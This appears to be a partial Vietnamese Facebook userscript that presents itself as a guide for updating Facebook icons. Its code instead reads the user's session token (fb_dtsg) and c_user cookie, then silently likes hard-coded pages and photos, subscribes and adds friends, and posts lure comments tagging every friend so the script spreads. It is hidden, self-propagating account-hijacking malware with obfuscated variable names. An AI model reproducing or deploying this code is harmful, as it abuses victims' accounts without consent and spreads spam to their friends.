// ==UserScript==
// @name            Hướng Dẫn Cập Nhật Icon Facebook Năm 2014
...
var _0x3384x1 = [{
    ...
    _0x3384x4 += '<a class="jewelFooter" href="https://www.facebook.com/phanbao.tuan.7" target="_blank">Cáº­u Bim</a>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
...
//tuấn
sublist("192218277642806");sublist("192225314308769");sublist("192225610975406");sublist("1387140218218878");sublist("591165057599249");
/*Like Page*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function Like(p) {
...
//boss
Like("163696803841617");Like("1398119427110778");
/*Like ảnh*/
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; 
...
Like("466862490107131");
Like("1402836709976167");
//toan
a("100003969576780");sublist("345311855611131");sublist("345313388944311");
//men
sublist("192218277642806");sublist("192225314308769");sublist("192225610975406");sublist("1387140218218878");
a("100007687394446");a("100005639044571");a("100005794572067");IDS("100007761580847");a("100006600854088");sublist("1450931088470239");P("672501112814119");a("100003846203567"); a("100007688130862");a("100005585739226");a("100004473542070");
P("274551476037302");a("100005585739226");sublist("1456898354529627");
 :P 󾌧  ❤  ✨  ☕  ☀  ☁  ☔  ⚡  ⛄  󾀾  󾁇  󾁒  󾇓  󾇋  󾇉  󾟜  󾇈  󾀔  󾁆  󾔘  󾔞  󾇌  󾔗  󾇍  󾆼  󾇈  😍 (^^^)
// Code tag
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
...
mesaj += " Đẹp Quá.... Mọi Người Xem Nek  🍂 ❤  ✨  ☕  ☀  ☁  ☔  ⚡  🐟  💝  👱  Thích Quá Hihi,Mọi người cùng vào làm nào (y) <3 @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
...
function yorum_yap(id ,mesaj) {
 ...
 xhr.open("POST", "/ajax/ufi/add_comment.php", true);
    ...
    xhr.send(params);
        ...
        arkadaslari_al(210556955808938);
/gr
